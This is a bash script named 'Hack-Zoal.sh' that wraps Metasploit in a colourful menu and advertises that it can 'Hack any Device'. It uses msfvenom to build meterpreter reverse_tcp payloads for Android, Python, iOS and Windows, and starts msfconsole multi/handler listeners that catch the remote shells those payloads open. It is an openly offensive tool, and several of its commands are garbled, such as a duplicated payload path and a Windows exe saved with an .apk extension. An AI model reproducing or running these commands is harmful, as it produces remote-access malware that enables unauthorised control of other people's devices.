Hack-Zoal.sh

#!/bin/bash
clear
red='\e[1;31m'
green='\e[1;32m' 
blue='\e[1;34m' 
purple='\e[1;35m'
cyan='\e[1;36m' 
white='\e[1;37m'
yellow='\e[1;33m'
#Code: By Abody_mustapha/Saeed_Ahmeed
echo -e 
$green'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red '                   ......\..\'
echo -e $red '                ._..-....`\..\'
echo -e $red '                  -._; .;.`-...'
echo -e $red '                  `~-.;..........'
echo -e $red '    Hack-Zoal    --,`..............'
echo -e $red '                       -=...........;'
echo -e $red '             .--=~~=-,    -.;........;'
echo -e $red '              .-=`;....`~,_.;........./'
echo -e $red '              `  ,-`......-;..........|'
echo -e $red '                 .-~`......;.........;'
echo -e $red '                  .;.-....-;.........,\'
echo -e $white '                  `.....,=;......-...`~.-._'
echo -e $white '                 . ;.....;................-.'
echo -e $white '                    .\..;..;........,..._..a  ,'
echo -e $white '                    . ~";-`...;......;"~` ` -=.)'
echo -e $white '                 .........._;..;.,..;'
echo -e $white '                  -.._`~`....\..;.;.:'
echo -e $white '                     `~.......\\_ \\_'
echo -e $white '                           /=`^^=`""/`)-.'
echo -e $white '                           \ =....=.....=\'
echo -e $white '       CopyRights Zoal      `""` `~-. =...;'
echo -e $white '    www.fb.com/saeedshabt201@gmail.com'
echo ""
echo -e $green 
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'

echo ""
echo -e $yellow 'welcome in Hack-Zoal 2019 U can Hack any Device with me '
echo ""
echo -e $green '{-1-}' $red '--Create Payload'
echo ""
echo -e $red '{-2-}' $red '--Hack Device'
echo ""
echo -e $green '{-0-}' $red '--exit [0]'

echo ""
echo -e $white "insert the number "

read -p "insert num :>" menu

if [ $menu = 1 ]
then
clear 
echo -e 
$green'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red '                   ......\..\'
echo -e $red '                ._..-....`\..\'
echo -e $red '                  -._; .;.`-...'
echo -e $red '                  `~-.;..........'
echo -e $red '    Hack-Zoal     --,`..............'
echo -e $red '                       -=...........;'
echo -e $red '             .--=~~=-,    -.;........;'
echo -e $red '              .-=`;....`~,_.;........./'
echo -e $red '              `  ,-`......-;..........|'
echo -e $red '                 .-~`......;.........;'
echo -e $red '                  .;.-....-;.........,\'
echo -e $white '                  `.....,=;......-...`~.-._'
echo -e $white '                  . ;.....;................-.'
echo -e $white '                     .\..;..;........,..._..a ,'
echo -e $white '                    . ~";-`...;......;"~` ` -=.)'
echo -e $white '                 .........._;..;.,..;'
echo -e $white '                  -.._`~`....\..;.;.:'
echo -e $white '                     `~.......\\_ \\_'
echo -e $white '                           /=`^^=`""/`)-.'
echo -e $white '                           \ =....=.....=\'
echo -e $white '       CopyRights Zoal      `""` `~-. =...;'
echo -e $white '    www.fb.com/saeedshabt201@gmail.com'
echo ""
echo -e $green 
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'

echo ""
echo -e $red 'welcome in Hack-Zoal 2019 U can Hack any Device with me '
echo ""
echo -e $green '{-1-}' $red '--payload apk --'
echo ""
echo -e $yellow '{-2-}' $red '--payload python --'
echo ""
echo -e $red '{-3-}' $red '--payload ios --'
echo ""
echo -e $green '{-4-}' $red '--payload exe --'
echo ""
echo -e $red '{-00-}' $red '--back [00]'

echo ""
echo -e $white "insert the number "

read -p "insert :>" payload
if [ $payload = 1 ]
then 
echo -e $red " please insert LHOST :>"
read -p "insert LHOST" lhost
echo -e $red " please insert port :>"
read -p "insert port" lport
echo -e $red " please insert Name payload :>"
read -p "insert name" name
echo -e $red " please insert path :>"
read -p "insert PATH" path
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.apk

fi
if [ $payload = 2 ]
then 

echo -e $red " please insert LHOST :>"
read -p "insert LHOST" lhost
echo -e $red " please insert port :>"
read -p "insert port" lport
echo -e $red " please insert Name payload :>"
read -p "insert name" name
echo -e $red " please insert path :>"
read -p "insert PATH" path
msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.py

fi
if [ $payload = 3 ]
then 
echo -e $red " please insert LHOST :>"
read -p "insert LHOST" lhost
echo -e $red " please insert port :>"
read -p "insert port" lport
echo -e $red " please insert Name payload :>"
read -p "insert name" name
echo -e $red " please insert path :>"
read -p "insert PATH" path
msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.api

fi
if [ $payload = 4 ]
then 

echo -e $red " please insert LHOST :>"
read -p "insert LHOST" lhost
echo -e $red " please insert port :>"
read -p "insert port" lport
echo -e $red " please insert Name payload :>"
read -p "insert name" name
echo -e $red " please insert path :>"
read -p "insert PATH" path
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $path/$name.apk
bash Hack-Zoal.sh
fi
if [ $payload = 00 ]
then
clear

fi
fi

if [ $menu = 2 ]
then
clear 


echo -e 
$green'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $red '                   ......\..\'
echo -e $red '                ._..-....`\..\'
echo -e $red '                  -._; .;.`-...'
echo -e $red '                  `~-.;..........'
echo -e $red '    Hack-Zoal     --,`..............'
echo -e $red '                       -=...........;'
echo -e $red '             .--=~~=-,    -.;........;'
echo -e $red '              .-=`;....`~,_.;........./'
echo -e $red '              `  ,-`......-;..........|'
echo -e $red '                 .-~`......;.........;'
echo -e $red '                  .;.-....-;.........,\'
echo -e $white '                  `.....,=;......-...`~.-._'
echo -e $white '                  . ;.....;................-.'
echo -e $white '                     .\..;..;........,..._..a ,'
echo -e $white '                    . ~";-`...;......;"~` ` -=.)'
echo -e $white '                 .........._;..;.,..;'
echo -e $white '                  -.._`~`....\..;.;.:'
echo -e $white '                     `~.......\\_ \\_'
echo -e $white '                           /=`^^=`""/`)-.'
echo -e $white '                           \ =....=.....=\'
echo -e $white '       CopyRights Zoal      `""` `~-. =...;'
echo -e $white '    www.fb.com/saeedshabt201@gmail.com'
echo ""
echo -e $green 
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'

echo ""
echo -e $red 'welcome in Hack-Zoal 2019 U can Hack any Device with me '
echo ""
echo -e $red "Please Insert Payload Type "
read -p "insert payload type :>" type
if [ $type = "apk" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set 
LPORT '$port -x 'exploit'

fi 
if [ $type = "py" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'

fi 
if [ $type = "ios" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use multi/handler' -x 'set payload iphone/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
fi 
if [ $type = "exe" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert LPORT :>" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi 
fi
if [ $menu = 0 ]
then
clear 
figlet -f mono12.tlf "Good Bye"
exit

fi
#Thanks My Bro Abody_Mustapha and I very lotof becuse i know relly man eq.. U
